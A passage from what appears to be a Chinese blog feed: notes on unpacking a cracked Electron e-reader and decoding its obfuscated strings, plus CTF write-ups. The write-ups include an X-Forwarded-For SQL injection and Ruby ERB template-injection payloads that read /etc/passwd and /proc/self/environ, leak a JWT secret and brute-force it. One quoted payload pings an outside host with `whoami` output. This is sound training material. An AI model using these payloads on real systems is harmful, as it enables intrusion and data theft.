        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>摸鱼的时候想边打游戏边看看小说，小说又是txt，于是找了个阅读器，可惜要会员，一搜，有破解版</p><p><a href="https://www.52pojie.cn/thread-1348204-1-1.html"><strong>【EPUB阅读器】Neat Reader v6.0.8 例行更新 去广告&amp;去各种限制&amp;可珍藏</strong></a></p><p>在此感谢@<a href="https://www.52pojie.cn/home.php?mod=space&uid=580490">夜泉</a>的无私奉献！</p><p>破解补丁看了下，是app.asar，突然想到以前汉化clash的时候，也是弄的这个，于是乎这次也来试试，把他改成我想要的形状。</p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">#先安装npm install asar -g#解包asar extract app.asar app#打包asar pack app app.asar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搜了下相关字符串，改了几个位置，</p><p>然后问题来了</p><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003235195.png"></p><p>这地方的字符串，一直没搜到，折腾了很久，翻了半天代码。unicode，十六进制，各个样式都搜了一遍，简直怀疑人生。</p><p>之后没办法，只能使出大杀器，文件比较，翻找了一下，终于找到了位置，叹为观止</p><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>原来，修改者加了个混淆函数，将中文转化为[ascii码10进制异或0x12的数字],这样就减少了字符串搜索的风险。</p><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003537545.png"></p><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003552075.png"></p><p>提取出来改改运行下</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">D &#x3D; (str) &#x3D;&gt; &#123;    var V1,        I_NMI2,        PcigmAelG3 &#x3D; &quot;&quot;;    I_NMI2 &#x3D; str[&quot;split&quot;](&quot;.&quot;);    for (V1 &#x3D; 0; V1 &lt; I_NMI2[&quot;length&quot;]; V1++) &#123;        PcigmAelG3 +&#x3D; String[&quot;fromCharCode&quot;](I_NMI2[V1] ^ 0x12);    &#125;    console.log(PcigmAelG3);&#125;;D(&quot;50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.39.32.98.125.120.123.119.60.113.124.82.22798.27867.50.63.50.22928.26510.35291.24453.35831.36733.20196.22895.30010.35813.25917.25363.27505.29274.65310.35831.34935.19987.20183.38466.30010.20124.23412.20082.21662.30726.31332.30460.30358.65289.19999.24453.23572.35831.34935.19987.30010.20124.21844.19976.25092.32791.38732.27847.30010.36870.65310.21556.21003.65310.19986.21013.21532.26510.35813.30010.25125.33272.36109.51&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003627648.png"></p><p>而且我也是刚刚才知道，<code>str.split</code>也可以<code>str[&quot;split&quot;]</code></p><p>算是开辟了新思路，收获很大。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> electron </tag>
            
            <tag> app.asar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[RoarCTF 2019]Online Proxy</title>
      <link href="/p/3818512365.html"/>
      <url>/p/3818512365.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>buu上的这题慢的要死，一个请求卡十秒，无语了</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>简单的sql注入</p><p>类似于二次注入，先是在请求头打入</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: 1&#39; or &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后会出现在<code>Current Ip</code>，之前打入的会出现在<code>Last Ip</code></p><p>直接跑脚本吧。</p><p>无语了，这也太慢了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Online-Proxy/image-20210811004531898.png"></p><p>跑了四个小时还没跑完，真无语了。</p><p>无语了，跑了八个小时，还有最后5位，靶机挂了，真无语了。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SCTF2019]Flag Shop</title>
      <link href="/p/1841453998.html"/>
      <url>/p/1841453998.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[ruby erb|ssti|jwt]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810153449038.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>点work会加钱，所以可以007不停工作这样几百年后就能买房了。</p><p>这题很容易想到有关cookie。</p><p>抓个包再随便点一点<img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810154500243.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810154529026.png"></p><p>网页上已经77了，burp里还是74，可见金额不是存session，而是存在本地cookie。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810154700928.png"></p><p>那只要解开cookie就行了。</p><p>因为是jwt加密，用jwtcrack试试。</p><p>没跑出来，还是得先找到key，得先看看其他地方。</p><p>扫了扫目录，发现robots.txt存在。</p><p>里面放了源码，ruby语法。</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'sinatra'</span><span class="token keyword">require</span> <span class="token string">'sinatra/cookies'</span><span class="token keyword">require</span> <span class="token string">'sinatra/json'</span><span class="token keyword">require</span> <span class="token string">'jwt'</span><span class="token keyword">require</span> <span class="token string">'securerandom'</span><span class="token keyword">require</span> <span class="token string">'erb'</span>set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/static'</span><span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>configure <span class="token keyword">do</span>  enable <span class="token symbol">:logging</span>  file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/../log/http.log'</span><span class="token punctuation">,</span><span class="token string">"a+"</span><span class="token punctuation">)</span>  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token boolean">true</span>  use <span class="token constant">Rack</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CommonLogger</span><span class="token punctuation">,</span> file<span class="token keyword">end</span>get <span class="token string">"/"</span> <span class="token keyword">do</span>  redirect <span class="token string">'/shop'</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token keyword">end</span>get <span class="token string">"/filebak"</span> <span class="token keyword">do</span>  content_type <span class="token symbol">:text</span>  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__<span class="token keyword">end</span>get <span class="token string">"/api/auth"</span> <span class="token keyword">do</span>  payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span> uid<span class="token punctuation">:</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> jkl<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token keyword">end</span>get <span class="token string">"/api/info"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span>  json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>uid<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"uid"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>jkl<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">end</span>get <span class="token string">"/shop"</span> <span class="token keyword">do</span>  erb <span class="token symbol">:shop</span><span class="token keyword">end</span>get <span class="token string">"/work"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#&#123;</span>params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex">/[0-9a-z]+/</span><span class="token punctuation">)</span><span class="token delimiter tag">&#125;</span></span>"</span><span class="token punctuation">)</span>      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#&#123;</span>params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">&#125;</span></span> is working"</span> <span class="token keyword">then</span>    auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    <span class="token constant">ERB</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('<span class="token interpolation"><span class="token delimiter tag">#&#123;</span>params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">&#125;</span></span> working successfully!')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>result  <span class="token keyword">end</span><span class="token keyword">end</span>post <span class="token string">"/shop"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>title<span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"no enough jkl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">else</span>    auth <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">&#123;</span>flag<span class="token punctuation">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>title<span class="token punctuation">:</span> <span class="token string">"success"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"jkl is good thing"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">islogin</span></span>  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>    redirect to<span class="token punctuation">(</span><span class="token string">'/shop'</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h3><p><a href="https://www.anquanke.com/post/id/86867">【技术分享】手把手教你如何完成Ruby ERB模板注入</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810161958684.png"></p><p>重点在这里，如果传入的参数do和name相等，则输出。</p><p>erb的模板注入形式如下</p><pre class="line-numbers language-none"><code class="language-none">&lt;%&#x3D; 7 * 7 %&gt;&lt;%&#x3D; File.open(&#39;&#x2F;etc&#x2F;passwd&#39;).read %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中<code>&lt;%=%&gt;</code>占用五个字符，而题目只给了七个可控字符。</p><p>所以这里利用ruby的<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义变量</a>，只用两个字符。</p><p>如下有两个办法，其实思路都一样。</p><h4 id="直接输出"><a href="#直接输出" class="headerlink" title="直接输出"></a>直接输出</h4><blockquote><p><code>$&#39;</code> The string to the right of the last successful match. 最后一次成功匹配的右侧的字符串</p></blockquote><p>利用<code>ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</code></p><p>内层的正则限制了SECRET为数字+小写字母，重点是前面的正则，<code>#&#123;&#125;</code>类似于php里的取变量，不用管。</p><p>因为SECERT是空，所以把完成的SECERT给输出出来了。</p><p>如图：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810195657304.png"></p><p>在这发现ruby的match挺怪的，可以pattern.mathch(string),也可以string.mathch(pattern)</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810185758372.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810193801522.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810193824137.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810195735718.png"></p><p><code>unless params[:SECRET].nil?</code>意思是设置了SECRET参数才执行代码块，所以要设个SECRET</p><pre class="line-numbers language-none"><code class="language-none">work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working&#x2F;&#x2F;urlencodework?SECRET&#x3D;&amp;name&#x3D;%3C%25%3D%24&#39;%25%3E&amp;do&#x3D;%3C%25%3D%24&#39;%25%3E%20is%20working<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>返回如下，这样就拿到了当下的jwt token和key</p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKServer: openrestyDate: Tue, 10 Aug 2021 08:55:15 GMTContent-Type: text&#x2F;html;charset&#x3D;utf-8Content-Length: 176Connection: closeSet-Cookie: auth&#x3D;eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJmMDBmZjcwNi02ZDFhLTQzOGQtOGM0OC02ZWMyYTNkN2Y1MzIiLCJqa2wiOjc1fQ.KH-pPeCd_V98pV9VdNCGEATa3XofmPKd934pW7mDqvw; domain&#x3D;0e50b8a0-5392-476e-a5ce-cd30228e8582.node4.buuoj.cn; path&#x3D;&#x2F;; HttpOnlyX-Content-Type-Options: nosniffX-Frame-Options: SAMEORIGINX-Xss-Protection: 1; mode&#x3D;block&lt;script&gt;alert(&#39;ebe18e25bc2e1a0d8d48db9b6df08d7101eed13861254583d435edf271c197e636d5e57a74a650fc39cbeaf4a78226d8290f2407cc0471d1314a5f4ea44d1877 working successfully!&#39;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上<a href="https://jwt.io/%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%E3%80%82">https://jwt.io/进行处理。</a></p><p>然后把key放进去，修改金额，拿到jwt token。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810171616528.png"></p><p>然后再打进去，返回成功，但是没看到flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810171408733.png"></p><p>竟然藏在jwt里，还得再解码下。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810171329820.png"></p><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>构造</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;&lt;%&#x3D;$~%&gt;do&#x3D;&lt;%&#x3D;$~%&gt; is working<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><code>$~</code> The information about the last match in the current scope.当前范围最后一次匹配的结果</p></blockquote><p><code>ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</code></p><p>SECRET参数可控，如果匹配到SECRET，则<code>$~</code>会在页面中返回</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://0e50b8a0-5392-476e-a5ce-cd30228e8582.node4.buuoj.cn"</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/auth"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">:</span>        now <span class="token operator">=</span> flag <span class="token operator">+</span> i        <span class="token comment">#now = i + flag</span>        res <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            url <span class="token operator">+</span> <span class="token string">"/work?name=%3c%25%3d%24%7e%25%3e&amp;do=%3c%25%3d%24%7e%25%3e%20is%20working&amp;SECRET="</span><span class="token operator">+</span>now<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">48</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            flag <span class="token operator">=</span> now            <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为不知道初始匹配的位置，比如SECRET为abcdefg，然后一开始匹配到d,第二次匹配到de,第三次def,这样后面的匹配完了，但前面的那几个还没匹配，所以需要执行两次。</p><p>第一次<code>now = flag + i</code> 将后面的字符串匹配出来，</p><p>第二次<code>now = i + flag</code>，flag填入，匹配前面的字符串。</p><h4 id="HTTP参数传递类型差异产生的攻击面"><a href="#HTTP参数传递类型差异产生的攻击面" class="headerlink" title="HTTP参数传递类型差异产生的攻击面"></a>HTTP参数传递类型差异产生的攻击面</h4><p>读取的是<code>/proc/self/environ</code>，这个可直接得到flag</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;work?do&#x3D;[&quot;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6&#x2F;&#x2F;urlencode&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;%5b%22%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e%22%2c%20%22%31%22%2c%20%22%32%22%2c%20%22%33%22%2c%20%22%34%22%2c%20%22%35%22%2c%20%22%36%22%5d%20%69%73%20%77%6f%72%6b%69%6e%67&amp;name[]&#x3D;%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
            <tag> Ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[MRCTF2020]Ezaudit</title>
      <link href="/p/2269707160.html"/>
      <url>/p/2269707160.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[php_mt_seed]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezaudit/image-20210810122524614.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>随手一输，<a href="http://www.zip,得/">www.zip，得</a> 源码泄漏</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$Private_key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Private_key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 